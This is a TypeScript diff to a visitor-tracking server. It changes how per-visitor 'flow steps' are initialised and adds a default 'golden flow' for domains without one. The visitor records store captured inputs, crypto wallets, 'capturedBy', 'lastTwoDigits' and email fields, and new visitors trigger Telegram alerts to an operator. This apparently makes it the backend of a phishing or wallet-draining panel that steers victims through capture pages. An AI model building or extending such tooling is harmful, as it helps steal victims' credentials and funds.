@@ -5,6 +5,7 @@ import { lookupIp } from './geoip.js';
 import { dbGetDomainByHost, dbSetVisitorFlowSteps } from './database.js';
 import { firstValidFlowStep, isValidFlowLabel } from './funnel.js';
 import { notifyVisitorConnect, routesEquivalent } from './telegram.js';
+import { initializeGoldenFlow } from './goldenFlow.js';
 
 export interface VisitorConnectInput {
 	ip: string;
@@ -72,15 +73,23 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 	const isNewSession = !existing || existing.status === 'offline';
 	const previousPageRoute = existing?.lastPageRoute || existing?.lastPage || '';
 
-	const initialFlowSteps =
-		existing?.flowSteps?.length
-			? existing.flowSteps
-			: domainFlow && !existing
-				? domainFlow.steps.map((page) => ({
-					page,
-					passed: !isValidFlowLabel(page)
-				}))
-				: [];
+	let initialFlowSteps = existing?.flowSteps?.length
+		? existing.flowSteps
+		: [];
+	let isGoldenFlow = existing?.isGoldenFlow ?? true;
+
+	if (initialFlowSteps.length === 0) {
+		if (domainFlow) {
+			initialFlowSteps = domainFlow.steps.map((page) => ({
+				page,
+				status: isValidFlowLabel(page) ? 'not_started' as const : 'completed' as const
+			}));
+			isGoldenFlow = false;
+		} else {
+			initialFlowSteps = initializeGoldenFlow();
+			isGoldenFlow = true;
+		}
+	}
 
 	const flowEntryLabel =
 		!existing && domainFlow ? firstValidFlowStep(domainFlow.steps) || '' : '';
@@ -103,7 +112,7 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 		platform,
 		device: parseUserAgent(userAgent),
 		lastPage: effectivePage,
-		lastPageRoute: effectivePage,
+		lastPageRoute: existing?.lastPageRoute || effectivePage,
 		flowSteps: initialFlowSteps,
 		inputs: existing?.inputs ?? {},
 		wallets: existing?.wallets ?? [],
@@ -117,6 +126,7 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 		userId: existing?.userId || crypto.randomUUID(),
 		userAgent,
 		flowBypassed: existing?.flowBypassed ?? false,
+		isGoldenFlow,
 		capturedBy: capturedBy || existing?.capturedBy || '',
 		lastTwoDigits: existing?.lastTwoDigits ?? '',
 		emailFrom: existing?.emailFrom ?? '',
@@ -125,7 +135,7 @@ export async function registerVisitorConnect(input: VisitorConnectInput): Promis
 
 	serverState.addVisitor(visitor);
 
-	if (!existing && domainFlow && initialFlowSteps.length > 0) {
+	if (!existing && initialFlowSteps.length > 0) {
 		try {
 			dbSetVisitorFlowSteps(ip, initialFlowSteps);
 		} catch {
